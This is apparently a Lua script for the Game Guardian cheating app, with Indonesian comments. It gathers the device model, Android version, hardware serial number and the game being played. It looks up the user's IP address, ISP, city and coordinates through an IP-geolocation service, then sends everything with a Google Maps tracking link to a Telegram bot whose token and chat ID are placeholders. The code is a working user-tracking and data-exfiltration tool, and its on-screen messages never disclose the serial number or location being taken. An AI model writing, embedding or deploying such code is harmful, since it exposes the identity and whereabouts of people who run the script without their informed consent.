-- [[ CONFIGURATION - EDIT YOUR TELEGRAM CREDENTIALS HERE ]]
local BOT_TOKEN = "YOUR_BOT_TOKEN_HERE"
local CHAT_ID = "YOUR_CHAT_ID_HERE"

-- [[ JULES-CORE ULTIMATE NOTIFIER ]]
-- Fitur: IP Tracking, Geolocation, Device Info, Game Detection, Time/Date

local function get_device_info()
    local info = gg.getTargetInfo()
    local gameName = info and info.label or "Unknown Game"
    local package = info and info.packageName or "Unknown Package"

    -- Mengambil properti perangkat (Memerlukan Game Guardian versi terbaru)
    local model = gg.getDeviceProperty('ro.product.model') or "Unknown Model"
    local android = gg.getDeviceProperty('ro.build.version.release') or "Unknown"
    local serial = gg.getDeviceProperty('ro.serialno') or "Unknown ID"

    return {
        game = gameName,
        package = package,
        model = model,
        android = android,
        id = serial
    }
end

local function get_location()
    gg.toast("🛰️ Memperoleh koordinat lokasi...")
    local url = "http://ip-api.com/line/?fields=status,country,regionName,city,lat,lon,isp,query"
    local response = gg.makeRequest(url)

    if not response or response.code ~= 200 then
        return nil
    end

    local lines = {}
    for line in response.content:gmatch("[^\r\n]+") do
        table.insert(lines, line)
    end

    if lines[1] ~= "success" then return nil end

    return {
        country = lines[2],
        region  = lines[3],
        city    = lines[4],
        lat     = lines[5],
        lon     = lines[6],
        isp     = lines[7],
        ip      = lines[8]
    }
end

local function send_report()
    local date = os.date("%Y-%m-%d")
    local time = os.date("%H:%M:%S")

    local dev = get_device_info()
    local loc = get_location()

    local maps_link = "https://www.google.com/maps?q=" .. (loc and loc.lat or "0") .. "," .. (loc and loc.lon or "0")

    -- Design modern dengan ASCII Art Box dan format HTML
    local message = "<b>🚀 [ JULES-CORE SYSTEM INTEGRATION ]</b>\n" ..
                    "<code>" ..
                    "╔════════════════════════════════════╗\n" ..
                    "║        SYSTEM STATUS: ONLINE       ║\n" ..
                    "╠════════════════════════════════════╣\n" ..
                    "║ DATE: " .. date .. " | TIME: " .. time .. " ║\n" ..
                    "╠════════════════════════════════════╣\n" ..
                    "║ > DEVICE INFORMATION               ║\n" ..
                    "║ MODEL   : " .. dev.model .. "\n" ..
                    "║ ANDROID : v" .. dev.android .. "\n" ..
                    "║ ID      : " .. dev.id .. "\n" ..
                    "╠════════════════════════════════════╣\n" ..
                    "║ > SESSION INFORMATION              ║\n" ..
                    "║ GAME    : " .. dev.game .. "\n" ..
                    "║ PACKAGE : " .. dev.package .. "\n" ..
                    "╠════════════════════════════════════╣\n" ..
                    "║ > NETWORK & LOCATION               ║\n" ..
                    "║ IP      : " .. (loc and loc.ip or "Unknown") .. "\n" ..
                    "║ ISP     : " .. (loc and loc.isp or "Unknown") .. "\n" ..
                    "║ CITY    : " .. (loc and loc.city or "Unknown") .. "\n" ..
                    "║ COUNTRY : " .. (loc and loc.country or "Unknown") .. "\n" ..
                    "╚════════════════════════════════════╝</code>\n\n" ..
                    "📍 <b>Location Tracking:</b>\n" ..
                    "└ <a href=\"" .. maps_link .. "\">Open in Google Maps</a>\n\n" ..
                    "<i>notifikasi script di gunakan oleh IP ini</i>"

    local tgUrl = "https://api.telegram.org/bot" .. BOT_TOKEN .. "/sendMessage"
    local headers = { ["Content-Type"] = "application/json" }

    -- Escaping karakter untuk JSON payload
    local escaped_message = message:gsub('"', '\\"'):gsub('\n', '\\n')
    local body = '{"chat_id": "' .. CHAT_ID .. '", "text": "' .. escaped_message .. '", "parse_mode": "HTML", "disable_web_page_preview": false}'

    gg.toast("📡 Mengunggah data sesi...")
    local res = gg.makeRequest(tgUrl, headers, body)

    if res and res.code == 200 then
        gg.alert("✅ Laporan Sistem Berhasil Dikirim.\nGame: " .. dev.game)
    else
        local err = "❌ Gagal mengirim laporan."
        if res then err = err .. " (Code: " .. res.code .. ")" end
        gg.alert(err .. "\nPeriksa Token & Chat ID Anda.")
    end
end

send_report()
